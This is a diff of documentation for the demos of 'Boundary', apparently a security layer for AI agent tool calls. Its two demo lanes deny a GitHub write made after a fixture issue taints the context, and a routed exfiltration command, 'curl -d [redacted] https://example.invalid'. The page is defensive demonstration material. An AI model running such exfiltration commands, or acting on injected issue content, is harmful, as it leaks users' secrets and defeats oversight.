@@ -1,15 +1,15 @@
-# Demos
+# Boundary Demos
 
-Boundary's demo story is two fixture-only proof lanes, not a broad adapter tour.
-Both lanes require no credentials, make no network calls, perform no live
-mutation, and emit a decision record.
+Boundary's public demo story is a two-lane proof spine, not a broad adapter
+tour. Each lane is fixture-only, requires no credentials, makes no network
+calls, performs no live mutation, and emits a decision record.
 
 | Lane | Status | Command | Dangerous action | Success signal |
 | --- | --- | --- | --- | --- |
 | Lane 1 - MCP | Production route | `boundary demo github-lethal-trifecta` | Write-after-taint GitHub action | `actual=DENY`, `upstream_called=false`, `reason=lethal_trifecta_detected` |
 | Lane 2 - Command Boundary | Delivered preview, routed-only | `boundary demo command-secret-exfil` | Routed secret-exfiltration command | `actual=DENY`, `executed=false`, `class=C6` |
 
-![Two equal-weight Boundary proof lanes](assets/two-lane-proof.svg)
+![Two equal-weight Boundary proof lanes](./assets/two-lane-proof.svg)
 
 ## Run Both Lanes
 
@@ -27,25 +27,18 @@ boundary verify-record github-lethal-trifecta-artifacts/decision-record.json
 boundary verify-record command-secret-exfil-artifacts/decision-record.json
 ```
 
+`decision record path:` points to a single JSON object that
+`boundary verify-record` consumes. `decision record log:` points to the
+multi-record JSONL audit log written beside it.
+
 ## Lane 1 - MCP
 
 `boundary demo github-lethal-trifecta` is the MCP production-route proof lane. A
 fixture GitHub issue creates untrusted context, then a private-repository write
 is denied before upstream GitHub execution.
 
-Expected success signal:
-
-```text
-actual action: DENY
-reason: lethal_trifecta_detected
-upstream_called=false
-```
-
-![Boundary denies a GitHub write-after-taint action before upstream execution](assets/github-lethal-trifecta-demo.gif)
-
-A real run of `boundary demo github-lethal-trifecta`. The static
-[deny-before-upstream walkthrough](assets/boundary-demo-walkthrough.svg) is a
-no-JS fallback and is a stylized diagram, not a literal capture.
+Read the lane detail:
+[DEMO_GITHUB_LETHAL_TRIFECTA.md](./DEMO_GITHUB_LETHAL_TRIFECTA.md).
 
 ## Lane 2 - Command Boundary
 
@@ -53,15 +46,10 @@ no-JS fallback and is a stylized diagram, not a literal capture.
 proof lane. A routed `curl -d [redacted] https://example.invalid` command is
 classified as secret exfiltration and denied before execution.
 
-Expected success signal:
+Read the lane detail:
+[command-boundary/DEMO.md](./command-boundary/DEMO.md).
 
-```text
-actual: DENY
-executed=false
-class=C6
-```
-
-## What They Prove
+## What These Demos Prove
 
 - Boundary can deny the two tested dangerous action patterns when the route is
   forced through Boundary.
@@ -71,20 +59,9 @@ class=C6
 
 ## What They Do Not Prove
 
-- They do not prove protection against every malicious prompt.
-- They do not protect direct, unrouted tool access.
+- They do not prove every malicious prompt is blocked.
+- They do not prove protection for direct, unrouted tool access.
 - They do not prove production deployment bypass resistance.
-- They do not promote preview surfaces to production.
-- They do not call live services or mutate real systems.
-
-## Decision Record
-
-Each governed denial emits a hash-verifiable decision record carrying the
-verdict, reason, and a decision hash. It is recorded evidence of the fixture
-run, not proof of production route enforcement.
-
-## Source Docs
-
-- [docs/DEMOS.md](https://github.com/Fulcrum-Governance/Fulcrum-Boundary/blob/main/docs/DEMOS.md)
-- [docs/DEMO_GITHUB_LETHAL_TRIFECTA.md](https://github.com/Fulcrum-Governance/Fulcrum-Boundary/blob/main/docs/DEMO_GITHUB_LETHAL_TRIFECTA.md)
-- [docs/command-boundary/DEMO.md](https://github.com/Fulcrum-Governance/Fulcrum-Boundary/blob/main/docs/command-boundary/DEMO.md)
+- They do not promote Command Boundary, Edit Boundary, Secure GitHub, or any
+  other preview surface to production.
+- They do not make live network calls or mutate real systems.
